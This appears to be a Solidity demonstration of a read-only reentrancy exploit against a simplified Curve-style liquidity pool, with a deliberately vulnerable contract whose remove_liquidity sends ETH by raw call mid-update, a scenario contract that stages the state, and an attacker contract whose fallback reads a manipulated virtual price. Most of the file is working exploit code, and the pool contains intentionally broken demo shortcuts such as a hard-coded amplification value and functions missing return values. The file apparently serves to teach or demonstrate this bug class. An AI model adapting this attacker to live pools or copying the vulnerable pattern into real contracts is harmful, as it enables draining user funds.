// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "hardhat/console.sol";

interface CurveToken{
    function mint(address to, uint256 value) external returns(bool);
    function burnFrom(address to, uint256 value) external returns(bool);
}

contract MintableToken is ERC20 {

    constructor (string memory name, string memory sym) ERC20(name, sym) {

    }

    function mint(address _user, uint _amount) public {
        _mint(_user, _amount);
    }
}

contract CurveTokenExample is CurveToken, ERC20{

    constructor() ERC20("ExampleLPToken", "ExCrvLP") {}

    function mint(address to, uint256 value) external returns(bool){
        _mint(to, value);
    }
    function burnFrom(address to, uint256 value) external returns(bool){
        _burn(to, value);
    }
}


contract curve{
    uint128 public constant  N_COINS = 2;
    uint256 public constant A_PRECISION =100;
    uint256 public constant PRECISION = 10e18;
    uint256 public future_A_time;
    uint256 public future_A;
    uint256 public initial_A_time;
    uint256 public initial_A;
    uint256[N_COINS] public admin_balances;
    address[N_COINS] public coins;
    address public lp_token;
    address public owner;
    uint256 public kill_deadline;
    uint256 public fee;
    uint256 public admin_fee;
    uint256 public future_fee;
    uint256 public future_owner;
    uint256 public future_admin_fee;
    mapping(uint256 => mapping(uint256 => mapping(uint256 => uint256))) _DEMO_D_MAPPING;




    
    // constructor(uint256 _future_A_time, uint256 _future_A, uint256 _initial_A_time, uint256 _initial_A, address owner ) {

    constructor(address _lp_token, address _token_addr) payable {
        lp_token = _lp_token;
        coins[1] = _token_addr;
    }

    function get_D(uint256[N_COINS] memory xp,uint256 amp) public returns(uint256) {
        uint256 S = 0;
        uint256 Dprev = 0;

        // DEMO Simplification
        // uint256 x;
        // return x;
        // return _DEMO_D_MAPPING[xp[0]][xp[1]][amp];
        // END Simplification

        for (uint256 _x=0;_x<xp.length;_x++){
            S +=xp[_x];
        }
        if(S == 0){
            return 0;
        }
        uint256 D=S;
        uint256 Ann = amp * N_COINS;
        for (uint _i=0;_i<255;++_i){
            console.log("get_D loop iteration is %d", _i);
            uint256 D_P = D;
            for (uint256 _x=0;_x<xp.length;_x++){
                D_P = D_P * D / (xp[_x] * N_COINS +1);
            }
            Dprev = D;
            D = (Ann * S / A_PRECISION + D_P * N_COINS) * D / ((Ann - A_PRECISION) * D / A_PRECISION + (N_COINS + 1) * D_P);
            if (D > Dprev){
                if (D - Dprev <= 1){
                    return D;
                }
            }
            else{
                if (Dprev - D <= 1){
                    return D;
                }
            }
        }
    }

    function get_D_mul_simple(uint256[N_COINS] memory xp,uint256 amp) public returns(uint256) {
        // DEMO Simplification

        return xp[0] * xp[1] * amp;
    }

    function get_D_addative_simple(uint256[N_COINS] memory xp,uint256 amp) public returns(uint256) {
        // DEMO Simplification

        return (xp[0] + xp[1]);
    }

    function _A() view public returns(uint256) {
        
        // Demo simplificaiton
        return 1e18;
        // Simplification end

        uint256 t1 = future_A_time;
        uint256 A1 = future_A;
        if (block.timestamp < t1){
            uint256 A0 = initial_A;
            uint256 t0 = initial_A_time;
            if (A1 > A0){
                return A0 + (A1 - A0) * (block.timestamp - t0) / (t1 - t0);
            }
            else{
                return A0 - (A0 - A1) * (block.timestamp - t0) / (t1 - t0);
            }
        }
        else{
            return A1;
        }
    }
    
    function _balances(uint256 _value) public view returns(uint256[N_COINS] memory) {
        return [
            address(this).balance - admin_balances[0] - _value,
            ERC20(coins[1]).balanceOf(address(this)) - admin_balances[1]];
    }

    function getVirtualPrice() public returns(uint256){
        uint256 D = this.get_D(_balances(0),_A());
        uint256 totalShares = ERC20(lp_token).totalSupply();
        return D * PRECISION / totalShares;
    }
    function remove_liquidity(uint256 _amount, uint256[N_COINS] memory _min_amounts) public returns(uint256[N_COINS] memory){
        uint256[N_COINS] memory amounts = _balances(0);
        uint256 total_supply = ERC20(lp_token).totalSupply();
        CurveToken(lp_token).burnFrom(msg.sender, _amount);
        for (uint256 i;i<N_COINS;i++){
            uint256 value = amounts[i] * _amount / total_supply;
            assert (value >= _min_amounts[i]);
            amounts[i] = value;
            if (i == 0){
                msg.sender.call{value:value}("");
            }
            else{
                assert (ERC20(coins[1]).transfer(msg.sender, value));
            }
        }
        return amounts;
    }

    // demo feature (tweak state)
    function setBalances(uint amount) public{
        CurveToken(lp_token).mint(msg.sender, amount);
    }

    function addScenarioEther() public payable {

    }

}


contract scenario {

    uint constant other_user_lp = 20e18;
    uint constant underlying_asset_before = 100e18;
    uint constant deposited_ether_before = 20e18;
    uint constant attacker_lp = 2e18;
    uint constant attacker_underlying = 10e18;
    uint constant attacker_deposit_eth = 2e18; 
    address constant other_user = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;

    address public last_attacker;

    // constructor() payable public {
    //     last_attacker = init_scenario();
    // }

    function init_scenario(/*address other_user*/) payable public returns(address) {
        CurveTokenExample lp_token = new CurveTokenExample(); 
        MintableToken token = new MintableToken("example", "ex");

        // setup curve contract and its ETH and shares BEFORE the attacker
        require(msg.value >= deposited_ether_before + attacker_deposit_eth, "Not enough funds sent to init the scenario");
        curve _curve = new curve{value: deposited_ether_before}(address(lp_token), address(token));
        lp_token.mint(other_user, other_user_lp);
        token.mint(address(_curve), underlying_asset_before);

        // Log the price before the attacker
        console.log("before the attacker got in the price is %s", _curve.getVirtualPrice());
        console.log("Real D is %s", _curve.get_D(_curve._balances(0), _curve._A()));
        console.log("Mul D is %s", _curve.get_D_mul_simple(_curve._balances(0), _curve._A()));
        console.log("Add D is %s", _curve.get_D_addative_simple(_curve._balances(0), _curve._A()));
        

        // attakcer contract
        attacker _attContract = new attacker(address(_curve));

        // setup state (mints)
        _curve.addScenarioEther{value: attacker_deposit_eth}();
        lp_token.mint(address(_attContract), attacker_lp);
        token.mint(address(_curve), attacker_underlying);

        
        // Run the exploit
        _attContract.exec();

        last_attacker = address(_attContract);
        return last_attacker;
    }
}

contract attacker{
    curve public _curve;
    ERC20 token;
    CurveTokenExample lp_token;

    constructor(address _curveAddr){
        _curve = curve(_curveAddr);
        token = ERC20(_curve.coins(1));
        lp_token = CurveTokenExample(_curve.lp_token());
    }
    function exec() public {
    // prepare token
        console.log("After Attacker deposit price is %s",_curve.getVirtualPrice());
        console.log("Real D is %s", _curve.get_D(_curve._balances(0), _curve._A()));
        console.log("Mul D is %s", _curve.get_D_mul_simple(_curve._balances(0), _curve._A()));
        console.log("Add D is %s", _curve.get_D_addative_simple(_curve._balances(0), _curve._A()));
        uint256 my_lp_balance = lp_token.balanceOf(address(this));
        uint[2] memory zeros = [uint(0), 0];
        console.log("trying to remove liq....");
        _curve.remove_liquidity(my_lp_balance, zeros);    // virtual price dropped
        console.log("after the attack price is %s",_curve.getVirtualPrice());
        console.log("Real D is %s", _curve.get_D(_curve._balances(0), _curve._A()));
        console.log("Mul D is %s", _curve.get_D_mul_simple(_curve._balances(0), _curve._A()));
        console.log("Add D is %s", _curve.get_D_addative_simple(_curve._balances(0), _curve._A()));
    }
    fallback() external payable {
        console.log("during the attack price is %s",_curve.getVirtualPrice());
        console.log("Real D is %s", _curve.get_D(_curve._balances(0), _curve._A()));
        console.log("Mul D is %s", _curve.get_D_mul_simple(_curve._balances(0), _curve._A()));
        console.log("Add D is %s", _curve.get_D_addative_simple(_curve._balances(0), _curve._A()));
    }
}



